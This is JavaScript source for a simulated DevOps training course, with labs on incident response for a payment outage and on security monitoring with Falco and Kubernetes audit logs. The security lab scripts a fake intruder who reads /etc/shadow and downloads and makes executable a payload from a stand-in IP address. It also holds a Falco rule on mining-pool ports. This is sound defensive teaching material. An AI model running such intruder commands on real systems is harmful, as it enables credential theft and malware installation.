  var PAY_CM = sc("apiVersion: v1", "kind: ConfigMap", "metadata:", "  name: payments-config", "data:", "  LOG_LEVEL: info", "  PAYMENTS_URL: https://pay.kestrel.example");
  var PAY_SECRET = { apiVersion: "v1", kind: "Secret", metadata: { name: "payments-key", namespace: "payments" }, type: "Opaque", stringData: { "api-key": M4.PAY_KEY } };
  var PAY = sc("apiVersion: apps/v1", "kind: Deployment", "metadata:", "  name: payments", "  labels:", "    app: payments", "spec:", "  replicas: 2", "  selector:", "    matchLabels:", "      app: payments", "  template:", "    metadata:", "      labels:", "        app: payments", "    spec:", "      containers:", "        - name: payments", "          image: ghcr.io/kestrel/payments-api:2.1.0", "          envFrom:", "            - configMapRef:", "                name: payments-config", "          env:", "            - name: PAYMENTS_API_KEY", "              valueFrom:", "                secretKeyRef:", "                  name: payments-key", "                  key: api-key", "          ports:", "            - containerPort: 8000")
    + M.res("100m", "64Mi", "128Mi") + "---\n" + M.svcL("payments", "payments", 80, 8000) + "---\n" + M4.ingress("payments", "payments.staging.kestrel.dev", "payments", 80);
  var PAY_RULE = sc("apiVersion: monitoring.coreos.com/v1", "kind: PrometheusRule", "metadata:", "  name: payments-alerts", "  namespace: payments", "  labels:", "    release: monitoring", "spec:", "  groups:", "    - name: payments", "      rules:", "        - alert: PaymentsHighErrorRate", "          expr: sum by (namespace) (rate(http_requests_total{job=\"payments\", code=~\"5..\"}[5m])) / sum by (namespace) (rate(http_requests_total{job=\"payments\"}[5m])) > 0.05", "          for: 2m", "          labels:", "            severity: critical", "          annotations:", "            summary: '{{ $value | humanizePercentage }} of payment requests are failing'", "            runbook_url: ~/runbooks/payments.md");
  var RUNBOOK = "# Runbook: payments\n\n## PaymentsHighErrorRate\n\nCustomers can't pay at checkout. Treat as SEV2 or worse.\n\n1. Acknowledge the page (`oncall ack ID`) so it stops escalating.\n2. Declare an incident: `oncall incident declare --sev 2 --title \"...\"`. You're the incident commander until you hand over.\n3. Post a first public update within 10 minutes: `oncall incident update --public --status investigating \"...\"`.\n4. Look at the errors:\n   - `logcli query --since 30m '{namespace=\"payments\", stream=\"stderr\"}'`\n   - errors from our provider look like `provider returned HTTP 5xx`.\n5. Provider down? Fail over to the secondary provider (EU):\n   - `kubectl -n payments patch configmap payments-config -p '{\"data\":{\"PAYMENTS_URL\":\"https://pay-eu.kestrel.example\"}}'`\n   - `kubectl -n payments rollout restart deploy/payments` (env from a ConfigMap is only read at start)\n   - watch the error rate fall: `promtool query instant $PROM 'sum(rate(http_requests_total{job=\"payments\",code=~\"5..\"}[2m]))'`\n6. Update the status page (`--status monitoring`), and resolve when the alert has resolved.\n7. Postmortem within 2 working days: copy ~/postmortems/TEMPLATE.md.\n";
  var PM_TEMPLATE = "# Postmortem: TITLE\n\nDate:\nAuthors:\nStatus: draft\n\n## Summary\n\n## Impact\n\n## Timeline (UTC)\n\n## Root cause\n\n## What went well\n\n## What went badly\n\n## Action items\n\n(blameless: describe systems and decisions, not people)\n";
  var PROVIDER_DOWN = function (cl, p, path, t, kind) { if (kind !== "payments" || t < -1080) return null; var c = K.ctrOf(cl, p); if (c && /pay-eu/.test((c.env || {}).PAYMENTS_URL || "")) return null; return { err: 0.42, code: "502", p50: 2400, p99: 10000, errMsg: "provider returned HTTP 503: upstream unavailable (POST https://pay.kestrel.example/v1/charges)" }; };
  var PM_507 = "# Postmortem: card payments failing (payment provider outage)\n\nDate: 2026-11-11\nAuthors: kc-dev\nStatus: draft\n\n## Summary\n\nFrom 08:42 UTC our primary payment provider returned HTTP 503 for about 4 in 10 charge requests. Checkout failed for those customers until we failed over to the EU provider.\n\n## Impact\n\nAbout 40% of payment attempts failed for roughly 25 minutes. No double charges.\n\n## Timeline (UTC)\n\n- 08:42 provider starts returning 503s\n- 08:45 PaymentsHighErrorRate pages on-call\n- 09:00 page acknowledged, incident declared (SEV2)\n- 09:02 logs show provider returned HTTP 503\n- 09:03 failed over to pay-eu, payments restarted\n- 09:10 error rate back to normal, alert resolved\n\n## Root cause\n\nThe primary payment provider had an outage (HTTP 503). We had no automatic failover, so a human had to switch PAYMENTS_URL.\n\n## What went well\n\n- The alert fired within 3 minutes and the runbook had the failover steps.\n\n## What went badly\n\n- The page waited 15 minutes for an acknowledgement.\n- Failover needs a manual ConfigMap change and restart.\n\n## Action items\n\n- Automatic failover between providers on repeated 5xx (owner: payments team)\n- Alert on provider error rate separately from our own errors\n- Subscribe to the provider's status page\n";
  LABS.push({
    id: "dev-507", n: 7, module: 5, ticket: "DEV-507", xp: 220, tool: "on-call",
    title: "Incident response",
    topic: "on-call, acknowledging pages, severity, incident command, runbooks, status updates, mitigation first, blameless postmortems",
    from: MAYA,
    story: "<p>You're on call this week. <b>You've just been paged</b>: <code>PaymentsHighErrorRate</code>. Customers can't pay.</p><p>Handle it the way we practise: acknowledge, declare an incident, follow the runbook (<code>~/runbooks/payments.md</code>), keep customers informed on the status page, <b>mitigate first</b> and investigate later, then write a <b>blameless postmortem</b> from the incident's timeline.</p>",
    learn:
      "<h3>The first five minutes</h3><ol><li><b>Acknowledge</b> the page: it tells the paging system a human has it, and stops escalation to the next person.</li><li><b>Declare</b> an incident with a <b>severity</b> (SEV1: everything down / data at risk; SEV2: a major feature broken for many customers; SEV3: degraded, workaround exists). Declaring early is cheap; you can always downgrade.</li><li>Someone is <b>incident commander</b>: coordinates and communicates, rather than debugging alone.</li></ol>" + ex("oncall pages") + ex("oncall ack P3X9QA") + ex("oncall incident declare --sev 2 --title \"Payments failing at checkout\"") +
      "<h3>Mitigate first</h3><p>Stop the bleeding before finding the root cause: roll back, fail over, scale up, turn off a feature. A <b>runbook</b> lists the known moves for an alert. Keep a log as you go (it becomes the timeline):</p>" + ex("oncall incident note \"Logs: provider returned HTTP 503 on charges\"") +
      "<h3>Communicate</h3><p>Customers see the <b>status page</b>; post early, then on every change of state (investigating → identified → monitoring → resolved):</p>" + ex("oncall incident update --public --status identified \"Our payment provider is failing; we're switching to a backup.\"") + ex("curl -s http://status.kestrel.dev") +
      "<h3>Blameless postmortems</h3><p>After the incident: what happened (timeline), the impact, the root cause and contributing factors, what went well and badly, and <b>action items</b> with owners. Blameless means describing systems and decisions, not people: \"the deploy had no canary\", not \"Bob broke it\". People who fear blame hide information.</p>" + ex("oncall incident timeline"),
    system: world({ namespaces: { shop: {}, payments: {} }, objects: M.shop().concat([M.SM_ORDERS, PAY_CM.replace("metadata:\n", "metadata:\n  namespace: payments\n"), PAY_SECRET, nsDoc(PAY, "payments"), O.serviceMonitor("payments", "payments", "payments"), PAY_RULE]), traffic: ["shop", "payments"], effects: [PROVIDER_DOWN], am: AM_GOOD,
      before: function (sys, c) { Dk.state(c.rt).validKeys = [M4.PAY_KEY]; },
      files: { "runbooks/payments.md": RUNBOOK, "postmortems/TEMPLATE.md": PM_TEMPLATE } }),
    starter: "",
    objectives: [
      { id: "ack", text: "Acknowledge the page.", hints: ["oncall pages, then oncall ack ID"],
        check: function (r) { return pages(r, "PaymentsHighErrorRate", function (n) { return n.acked; }).length ? true : "oncall pages; oncall ack ID"; } },
      { id: "declare", text: "Declare an incident with the right severity (read the runbook), and post a first public update.", hints: ["oncall incident declare --sev 2 --title \"Payments failing at checkout\"", "oncall incident update --public --status investigating \"Some card payments are failing. We're investigating.\""],
        check: function (r) { var x = inc(r); if (!x) return "Declare an incident: oncall incident declare --sev 2 --title ..."; if (x.sev > 2) return "Customers can't pay: the runbook says SEV2 or worse."; return x.updates.some(function (u) { return u.pub; }) ? true : "Post a first public update: oncall incident update --public --status investigating \"...\""; } },
      { id: "cause", text: "Find what's failing in the logs, and note it in the incident.", hints: ["logcli query --since 30m '{namespace=\"payments\", stream=\"stderr\"}'", "oncall incident note \"provider returned HTTP 503\""],
        check: function (r) { if (!logq(r, /namespace="payments"/, /provider returned HTTP 503/)) return "Read the payments errors in Loki: logcli query --since 30m '{namespace=\"payments\", stream=\"stderr\"}'"; var x = inc(r); return x && x.log.some(function (l) { return /503|provider/i.test(l.text) && !/^Status page:/.test(l.text); }) ? true : "Note what you found: oncall incident note \"...\""; } },
      { id: "mitigate", text: "Mitigate: fail over to the EU provider as the runbook says, and see the error rate drop and the alert resolve.", hints: ["kubectl -n payments patch configmap payments-config -p '{\"data\":{\"PAYMENTS_URL\":\"https://pay-eu.kestrel.example\"}}'", "kubectl -n payments rollout restart deploy/payments; kubectl -n payments rollout status deploy/payments", "sleep 300; amtool alert"],
        check: function (r) { var pods = H.running(r, "payments", { matchLabels: { app: "payments" } }); if (!pods.length || pods.some(function (p) { var c = K.ctrOf(cl(r), p); return !c || !/pay-eu/.test((c.env || {}).PAYMENTS_URL || ""); })) return "The payments pods still use the primary provider: change the ConfigMap and restart the Deployment."; if (firing(r, "PaymentsHighErrorRate").length) return "PaymentsHighErrorRate is still firing: give the 5m window time (sleep)."; return prom(r, /http_requests_total\{[^}]*job="payments"/) ? true : "Check the error rate yourself with a PromQL query."; } },
      { id: "comms", text: "Keep customers informed: an update when you've identified it and one when it's fixed, then resolve the incident.", hints: ["oncall incident update --public --status identified \"...\"", "oncall incident update --public --status monitoring \"...\"; oncall incident resolve"],
        check: function (r) { var x = inc(r); if (!x) return "Declare the incident first."; var pub = x.updates.filter(function (u) { return u.pub; }); if (pub.length < 3) return "Post at least three public updates (investigating, identified, monitoring/resolved): " + pub.length + " so far."; return x.state === "resolved" ? true : "Resolve the incident: oncall incident resolve"; } },
      { id: "pm", text: "Write a blameless postmortem in <code>~/postmortems/</code> from the template: summary, impact, a timeline with times, root cause, and at least two action items.", hints: ["oncall incident timeline gives you the times.", "cp ~/postmortems/TEMPLATE.md ~/postmortems/2026-11-11-payments.md and fill it in"],
        check: function (r) { var dir = Dk.fsNode(r.sys, HOME + "/postmortems"), names = dir && dir.children ? keys(dir.children).filter(function (n) { return /\.md$/.test(n) && n !== "TEMPLATE.md"; }) : []; if (!names.length) return "Write a postmortem file in ~/postmortems/ (not the template)."; var t = file(r, "~/postmortems/" + names[0]); var miss = ["Summary", "Impact", "Timeline", "Root cause", "Action items"].filter(function (h) { return !section(t, h); }); if (miss.length) return "The postmortem needs sections: " + miss.join(", ") + "."; if ((t.match(/\b\d\d:\d\d\b/g) || []).length < 4) return "The timeline needs times (at least four events)."; if (!/503|provider/i.test(t)) return "The root cause should say what failed (the provider's 503s)."; if (bullets(t, "Action items") < 2) return "At least two action items, as a list."; return BLAME.test(t) ? "Keep it blameless: describe systems and decisions, not who's at fault." : true; } }
    ],
    solution: sol("oncall pages", "cat ~/runbooks/payments.md", "oncall ack $(oncall pages | awk '/PaymentsHighErrorRate/ {print $1; exit}')", "oncall incident declare --sev 2 --title \"Payments failing at checkout\"",
      "oncall incident update --public --status investigating \"Some card payments are failing. We're investigating.\"",
      "logcli query --since 30m --limit 5 '{namespace=\"payments\", stream=\"stderr\"}'", "oncall incident note \"Logs: provider returned HTTP 503 on about 40% of charges\"",
      "oncall incident update --public --status identified \"Our payment provider is failing. We're switching to a backup provider.\"",
      "kubectl -n payments patch configmap payments-config -p '{\"data\":{\"PAYMENTS_URL\":\"https://pay-eu.kestrel.example\"}}'", "kubectl -n payments rollout restart deploy/payments", "kubectl -n payments rollout status deploy/payments",
      "oncall incident note \"Failed over to pay-eu\"", "sleep 300", "promtool query instant $PROM 'sum(rate(http_requests_total{job=\"payments\",code=~\"5..\"}[2m]))'", "amtool alert",
      "oncall incident update --public --status monitoring \"Payments work again through our backup provider. We're monitoring.\"", "oncall incident resolve", "oncall incident timeline",
      { nano: "~/postmortems/2026-11-11-payments.md", text: PM_507 }),
    debrief: "<p>Acknowledge, declare, communicate, mitigate, then learn. The fix took two commands because the runbook had them ready; finding the cause took one log query because errors carried the provider's response. The status page got an update at every change, and the postmortem focuses on what to change in the system (automatic failover, a provider-specific alert) rather than on who was slow to respond.</p>",
    realworld: "PagerDuty, Opsgenie and Grafana OnCall handle schedules, escalation and paging; incident.io, FireHydrant and Rootly run incidents in Slack (channels, roles, timelines, status pages); Statuspage and Instatus host status pages. Google's SRE book chapters on incident management and postmortem culture are the classic reading.",
    quiz: [
      { q: "Paged at 3 a.m. for customers unable to pay. First?", options: ["Find the root cause", "Acknowledge the page and declare an incident", "Write the postmortem", "Restart everything"], answer: 1, why: "Own it, then coordinate; investigate after." },
      { q: "Why mitigate before finding the root cause?", options: ["Root causes don't matter", "Customers are hurting now: stop the impact first, investigate safely after", "It's faster to write", "Policy"], answer: 1, why: "Rollback/failover first; analysis later." },
      { q: "Which is blameless?", options: ["Sam deployed without testing", "The deploy pipeline had no automated test gate for this path", "QA should have caught it", "It was the new hire"], answer: 1, why: "Describe systems and decisions, not people." }
    ]
  });

  /* ================================================================== DEV-508 Security monitoring */
  var RBAC_508 = sc("apiVersion: v1", "kind: ServiceAccount", "metadata:", "  name: ci-deployer", "  namespace: shop", "---", "apiVersion: rbac.authorization.k8s.io/v1", "kind: Role", "metadata:", "  name: deployer", "  namespace: shop", "rules:", "  - apiGroups: [\"apps\"]", "    resources: [\"deployments\"]", "    verbs: [\"get\", \"list\", \"patch\", \"update\"]", "---", "apiVersion: rbac.authorization.k8s.io/v1", "kind: RoleBinding", "metadata:", "  name: ci-deployer", "  namespace: shop", "roleRef:", "  apiGroup: rbac.authorization.k8s.io", "  kind: Role", "  name: deployer", "subjects:", "  - kind: ServiceAccount", "    name: ci-deployer", "    namespace: shop",
    "---", "apiVersion: rbac.authorization.k8s.io/v1", "kind: Role", "metadata:", "  name: pod-debugger", "  namespace: shop", "rules:", "  - apiGroups: [\"\"]", "    resources: [\"pods\"]", "    verbs: [\"get\", \"list\"]", "  - apiGroups: [\"\"]", "    resources: [\"pods/exec\"]", "    verbs: [\"create\"]", "---", "apiVersion: rbac.authorization.k8s.io/v1", "kind: RoleBinding", "metadata:", "  name: ci-deployer-debug", "  namespace: shop", "roleRef:", "  apiGroup: rbac.authorization.k8s.io", "  kind: Role", "  name: pod-debugger", "subjects:", "  - kind: ServiceAccount", "    name: ci-deployer", "    namespace: shop");
  var SA = "system:serviceaccount:shop:ci-deployer";
  function intruder(sys, c) {
    var p = K.list(c, "Pod", "shop").filter(function (x) { return (x.metadata.labels || {}).app === "web"; })[0]; if (!p) return;
    c.obs.victim = p.metadata.name;
    O.at(c, -2410, function (cl2, t) {
      var ctr = K.ctrOf(cl2, p); if (!ctr) return;
      cl2.audit.push({ t: t, cmd: "sh", user: SA, verb: "exec", kind: "Pod", ns: "shop", name: p.metadata.name });
      O.procEvents(cl2, p, ctr, "sh", { pname: "runc", tty: true, t: t });
      [["id", 8], ["cat /etc/shadow", 21], ["wget -q -O /tmp/kworkerd http://203.0.113.50:8080/kworkerd", 49], ["chmod +x /tmp/kworkerd", 55]].forEach(function (x) { O.procEvents(cl2, p, ctr, x[0], { tty: true, t: t + x[1] }); });
    });
  }
  var FALCO_CUSTOM = sc("- list: miner_ports", "  items: [3333, 4444, 5555, 7777, 14444]", "", "- rule: Outbound connection to crypto-mining pool port", "  desc: A container connected to a port that mining pools use", "  condition: outbound and container and fd.sport in (miner_ports)", "  output: Possible crypto-miner connection (command=%proc.cmdline connection=%fd.name k8s_ns=%k8s.ns.name k8s_pod_name=%k8s.pod.name image=%container.image.repository)", "  priority: CRITICAL", "  tags: [network, mitre_impact, T1496]");
  var FALCO_CM = "kubectl -n falco create configmap falco-rules-custom --from-file=custom-rules.yaml";
  function customRule(r) { var c = cl(r); if (!c) return null; var R = O.falcoRules(c); return R.rules.filter(function (x) { return !/^(Terminal shell in container|Read sensitive file untrusted)$/.test(x.rule); })[0] || null; }
  LABS.push({
    id: "dev-508", n: 8, module: 5, ticket: "DEV-508", xp: 220, tool: "Falco",
    title: "Security monitoring",
    topic: "runtime detection with Falco (rules, macros, lists, priorities), Kubernetes audit logs in Loki, finding who did what, containing a leaked credential, a custom detection",
    from: DEV,
    story: "<p>Falco went on kestrel-staging last week: it watches system calls on every node and reports suspicious behaviour in containers. Its alerts go through Alertmanager like everything else, and its <b>Warning</b> from about 40 minutes ago is worrying: someone read <code>/etc/shadow</code> inside a shop web pod.</p><p>Find out what happened and who did it (the API server's <b>audit log</b> is in Loki), shut the door they came through, and add a detection for the thing I'm most worried about next: a <b>crypto miner</b> connecting to a mining pool.</p>",
    learn:
      "<h3>Falco</h3><p>Falco runs on every node (a DaemonSet), reads kernel events (process starts, file opens, network connections) and matches them against <b>rules</b>. Each event carries fields like <code>proc.name</code>, <code>proc.cmdline</code>, <code>fd.name</code> (a file or connection), <code>container.image.repository</code>, <code>k8s.pod.name</code>.</p>" + code("- list: shell_binaries\n  items: [bash, sh, dash]\n- macro: spawned_process\n  condition: (evt.type in (execve, execveat))\n- rule: Terminal shell in container\n  condition: spawned_process and container and proc.name in (shell_binaries) and proc.tty != 0\n  output: A shell was spawned in a container (user=%user.name command=%proc.cmdline pod=%k8s.pod.name)\n  priority: NOTICE") +
      "<p><b>Lists</b> and <b>macros</b> keep conditions readable; <code>priority</code> ranges from DEBUG to EMERGENCY. Custom rules here go in the ConfigMap <code>falco/falco-rules-custom</code> (any key), loaded after the defaults. Falcosidekick forwards Warning and above to Alertmanager.</p>" + ex("kubectl logs -n falco -l app.kubernetes.io/name=falco | jq -r .output") + ex("logcli query '{namespace=\"falco\"} | json | priority=\"Warning\"'") +
      "<h3>Audit logs</h3><p>The API server records every request: who (<code>user.username</code>), what (<code>verb</code>, <code>objectRef</code>), when. Here they're shipped to Loki under <code>{job=\"kube-apiserver-audit\"}</code>. A <code>kubectl exec</code> is a <code>create</code> on the <code>pods/exec</code> subresource.</p>" + ex("logcli query --since 2h '{job=\"kube-apiserver-audit\"} |= \"exec\" | json | line_format \"{{.user_username}} {{.objectRef_name}}\"'") +
      "<h3>Testing a detection</h3><p>Trigger it on purpose, in a pod you control, and see it arrive:</p>" + ex("kubectl -n shop exec deploy/web -- nc -w 2 pool.example-mining.net 3333"),
    system: world({ falco: true, objects: M.shop().concat([M.SM_ORDERS, RBAC_508]), traffic: ["shop"], am: AM_GOOD, after: intruder }),
    starter: "",
    objectives: [
      { id: "falco", text: "Read Falco's events. What happened in the shop, in which pod?", hints: ["kubectl logs -n falco -l app.kubernetes.io/name=falco | jq -r .output", "or: logcli query --since 2h '{namespace=\"falco\"}'"],
        check: function (r) { return ran(r, /\b(kubectl\s+logs\b[\s\S]*falco|logcli\s+query\b[\s\S]*falco)/, function (e) { return /Sensitive file opened|shadow/.test(all(e)); }) ? true : "Read the Falco events (kubectl logs -n falco ... or logcli)."; } },
      { id: "who", text: "Find out who ran it: which identity exec'd into that pod, according to the API server's audit log?", hints: ["logcli query --since 2h '{job=\"kube-apiserver-audit\"} |= \"exec\"'"],
        check: function (r) { return logq(r, /kube-apiserver-audit/, /ci-deployer/) ? true : "Search the audit log for exec: logcli query --since 2h '{job=\"kube-apiserver-audit\"} |= \"exec\"'"; } },
      { id: "contain", text: "Contain it: <code>ci-deployer</code> (a CI token that leaked) must lose the right to exec into pods, without breaking its real job (updating Deployments). Then replace the web pods the intruder touched.", hints: ["kubectl -n shop get rolebindings -o wide; kubectl -n shop describe role pod-debugger", "kubectl -n shop delete rolebinding ci-deployer-debug; kubectl auth can-i create pods/exec -n shop --as=" + SA, "kubectl -n shop rollout restart deploy/web"],
        check: function (r) { var c = cl(r), sub = K.subjectOf(c, null, SA); if (K.can(c, sub, "create", "pods/exec", "", "shop")) return "ci-deployer can still exec into pods in shop."; if (!K.can(c, sub, "patch", "deployments", "apps", "shop")) return "ci-deployer must still be able to update Deployments (its job)."; if (!ran(r, /\bauth\s+can-i\b[\s\S]*pods\/exec/)) return "Prove it: kubectl auth can-i create pods/exec -n shop --as=" + SA; if (H.pods(r, "shop", { matchLabels: { app: "web" } }).some(function (p) { return p.metadata.name === c.obs.victim; })) return "The pod the intruder used is still running: replace the web pods (kubectl -n shop rollout restart deploy/web)."; return H.deployOk(r, "shop", "web") ? true : "Wait for the new web pods."; } },
      { id: "rule", text: "Add a Falco rule that flags outbound connections from containers to mining-pool ports (3333, 4444, 5555, 7777, 14444), priority <code>CRITICAL</code>, in the ConfigMap <code>falco-rules-custom</code> in <code>falco</code>.", hints: ["A list miner_ports, and a rule with condition: outbound and container and fd.sport in (miner_ports)", FALCO_CM],
        check: function (r) { var c = cl(r); if (!H.get(r, "ConfigMap", "falco", "falco-rules-custom")) return "Create the ConfigMap falco-rules-custom in falco."; var R = O.falcoRules(c); if (R.errs.length) return "Falco can't load the rules: " + R.errs[0]; var x = customRule(r); if (!x) return "No custom rule in falco-rules-custom."; try { var f = O.falcoCompile(x.condition, R); var hit = f({ "evt.type": "connect", "container.id": "abc", "fd.sport": "3333", "fd.rport": "3333", "proc.name": "nc" }), miss = f({ "evt.type": "connect", "container.id": "abc", "fd.sport": "443", "fd.rport": "443", "proc.name": "curl" }); if (!hit || miss) return "The condition should match connections to port 3333 and not to 443."; } catch (e) { return "Falco can't compile the condition: " + e.message; } return String(x.priority).toUpperCase() === "CRITICAL" ? true : "Make it priority: CRITICAL."; } },
      { id: "test", text: "Test the detection safely (a connection attempt from a shop pod to port 3333 of <code>pool.example-mining.net</code>) and see the page it causes.", hints: ["kubectl -n shop exec deploy/web -- nc -w 2 pool.example-mining.net 3333", "sleep 60; oncall pages"],
        check: function (r) { var x = customRule(r); if (!x) return "Add the rule first."; if (!OH.falco(r, function (f) { return f.rule === x.rule; }).length) return "No event from your rule yet: trigger it with nc to port 3333 from a pod."; return oncall(r, /pages/, /Falco/) ? true : "See it reach on-call: sleep 60; oncall pages"; } }
    ],
    solution: sol("kubectl logs -n falco -l app.kubernetes.io/name=falco | jq -r .output", "logcli query --since 2h --limit 10 '{namespace=\"falco\"} | json | line_format \"{{.time}} {{.rule}} {{.output_fields_k8s_pod_name}}\"'",
      "logcli query --since 2h --limit 5 '{job=\"kube-apiserver-audit\"} |= \"exec\" | json | line_format \"{{.requestReceivedTimestamp}} {{.user_username}} exec {{.objectRef_name}}\"'",
      "kubectl -n shop get rolebindings -o wide", "kubectl -n shop describe role pod-debugger", "kubectl -n shop delete rolebinding ci-deployer-debug",
      "kubectl auth can-i create pods/exec -n shop --as=" + SA, "kubectl auth can-i patch deployments -n shop --as=" + SA, "kubectl -n shop rollout restart deploy/web", "kubectl -n shop rollout status deploy/web",
      { nano: "custom-rules.yaml", text: FALCO_CUSTOM }, FALCO_CM, "kubectl -n shop exec deploy/web -- nc -w 2 pool.example-mining.net 3333", "sleep 60",
      "kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=3 | jq -r .output", "oncall pages | head -3"),
    debrief: "<p>Falco saw the behaviour (a shell, a read of <code>/etc/shadow</code>, a download into <code>/tmp</code>), and the audit log named the identity: the CI deployer's service account, which had been given <code>pods/exec</code> \"for debugging\" and whose token leaked. You removed that one binding (least privilege: deploying never needed exec), replaced the touched pods, and added a detection you tested by triggering it on purpose. In a real incident you'd also rotate the leaked token and check what else it could reach.</p>",
    realworld: "Falco is a CNCF graduated project; Tetragon and Tracee do similar eBPF-based detection, and cloud services (GuardDuty for EKS, Defender for Containers, Security Command Center) add managed detections. Audit logs usually go to a SIEM (Elastic, Splunk, Sentinel). The Falco rules repository and MITRE ATT&CK for containers are good references for what to detect.",
    quiz: [
      { q: "What does Falco watch?", options: ["Container images in the registry", "Kernel events (processes, files, network) on each node, matched against rules", "Git commits", "Prometheus metrics"], answer: 1, why: "It's runtime detection from syscalls." },
      { q: "Where do you find who ran a <code>kubectl exec</code>?", options: ["The pod's logs", "The API server audit log (user, verb create, pods/exec)", "Falco only", "kubectl get events"], answer: 1, why: "Audit logs record every API request with the identity." },
      { q: "How do you know a new detection works?", options: ["Trust the YAML", "Trigger it safely on purpose and see the event and alert arrive", "Wait for an attack", "Restart Falco"], answer: 1, why: "Test detections like code." }
    ]
  });

  /* ================================================================== DEV-509 Capstone: the 3 a.m. outage */
  function apiYaml(tag) { return sc("apiVersion: apps/v1", "kind: Deployment", "metadata:", "  name: orders-api", "  labels:", "    app: orders-api", "spec:", "  replicas: 2", "  selector:", "    matchLabels:", "      app: orders-api", "  template:", "    metadata:", "      labels:", "        app: orders-api", "    spec:", "      containers:", "        - name: api", "          image: ghcr.io/kestrel/orders-api:" + tag, "          env:", "            - name: DB_PASSWORD", "              valueFrom:", "                secretKeyRef:", "                  name: db", "                  key: password", "            - name: DATABASE_URL", "              value: postgresql://postgres:$(DB_PASSWORD)@db:5432/orders", "            - name: REDIS_URL", "              value: redis://redis:6379/0", "            - name: LOG_FORMAT", "              value: json", "          ports:", "            - containerPort: 8000") + M.res("100m", "128Mi", "256Mi") + "---\n" + M.svcL("orders-api", "orders-api", 8000, 8000); }
  var CAP_SM = O.serviceMonitor("orders-api", "shop", "orders-api").replace("  namespace: shop\n", "");
  function capFiles(tag) { return { "README.md": "# kestrel/k8s-config\n\nshop/   the Kestrel shop, deployed by Argo CD (Application shop)\n", "shop/web.yaml": M4.CAP_WEB, "shop/orders-api.yaml": apiYaml(tag), "shop/db.yaml": M4.CAP_DB, "shop/redis.yaml": M4.CAP_REDIS, "shop/ingress.yaml": M4.ingress("web", "shop.staging.kestrel.dev", "web", 80), "shop/servicemonitor.yaml": CAP_SM }; }
  var CAP_RULES = sc("apiVersion: monitoring.coreos.com/v1", "kind: PrometheusRule", "metadata:", "  name: orders-api", "  namespace: shop", "  labels:", "    release: monitoring", "spec:", "  groups:", "    - name: orders-api-slo", "      rules:",
    "        - record: slo:orders_api_errors:ratio_rate5m", "          expr: sum by (namespace) (rate(http_requests_total{job=\"orders-api\", code=~\"5..\"}[5m])) / sum by (namespace) (rate(http_requests_total{job=\"orders-api\"}[5m]))",
    "        - record: slo:orders_api_errors:ratio_rate1h", "          expr: sum by (namespace) (rate(http_requests_total{job=\"orders-api\", code=~\"5..\"}[1h])) / sum by (namespace) (rate(http_requests_total{job=\"orders-api\"}[1h]))",
    "        - alert: OrdersApiErrorBudgetBurn", "          expr: slo:orders_api_errors:ratio_rate1h > (14.4 * 0.005) and slo:orders_api_errors:ratio_rate5m > (14.4 * 0.005)", "          for: 2m", "          labels:", "            severity: critical", "          annotations:", "            summary: 'orders-api is failing {{ $value | humanizePercentage }} of requests (error budget burning 14x too fast)'", "            runbook_url: https://wiki.kestrel.dev/runbooks/orders-api",
    "        - alert: OrdersApiRestarting", "          expr: increase(kube_pod_container_status_restarts_total{namespace=\"shop\", container=\"api\"}[30m]) > 2", "          labels:", "            severity: warning", "          annotations:", "            summary: '{{ $labels.pod }} restarted {{ $value | humanize }} times in 30 minutes'");
  var NEAR_RULE = sc("apiVersion: monitoring.coreos.com/v1", "kind: PrometheusRule", "metadata:", "  name: orders-api-memory", "  namespace: shop", "  labels:", "    release: monitoring", "spec:", "  groups:", "    - name: orders-api-memory", "      rules:", "        - alert: OrdersApiMemoryNearLimit", "          expr: sum by (namespace, pod) (container_memory_working_set_bytes{namespace=\"shop\", container=\"api\"}) / sum by (namespace, pod) (kube_pod_container_resource_limits{namespace=\"shop\", container=\"api\", resource=\"memory\"}) > 0.8", "          for: 5m", "          labels:", "            severity: warning", "          annotations:", "            summary: '{{ $labels.pod }} is at {{ $value | humanizePercentage }} of its memory limit'");
  var PM_509 = "# Postmortem: orders failing after orders-api 3.2.0 (memory leak)\n\nDate: 2026-11-11\nAuthors: kc-dev\nStatus: draft\n\n## Summary\n\norders-api 3.2.0 added an in-memory cache of recent orders that was never evicted. Each pod's memory grew by about 17 MiB a minute until the 256Mi limit, when the kernel OOMKilled it. Near the limit requests failed, and every restart dropped requests.\n\n## Impact\n\nAbout a quarter of order requests failed for roughly an hour (08:15 to 09:10 UTC).\n\n## Timeline (UTC)\n\n- 08:08 orders-api 3.2.0 merged to k8s-config, Argo CD rolls it out\n- 08:16 first OOMKilled restart\n- 08:20 OrdersApiErrorBudgetBurn pages on-call\n- 09:00 page acknowledged, incident declared (SEV2)\n- 09:04 metrics: OOMKilled restarts, memory growing linearly; logs: order cache growing\n- 09:06 rollback to 3.1.0 pushed to Git, Argo CD synced\n- 09:15 error rate normal, alert resolved\n\n## Root cause\n\nA memory leak in orders-api 3.2.0: the new order cache was never evicted, so memory grew until the pods were OOMKilled.\n\n## What went well\n\n- Rolling back was one Git revert; Argo CD did the rest.\n\n## What went badly\n\n- We only alerted on the errors, not on memory approaching the limit.\n- The page waited 40 minutes for an acknowledgement.\n\n## Action items\n\n- Alert when a pod's memory is above 80% of its limit (added: OrdersApiMemoryNearLimit)\n- Bound the order cache (max size + TTL) and add a memory soak test to CI\n- Canary new orders-api versions for 30 minutes before a full rollout\n";
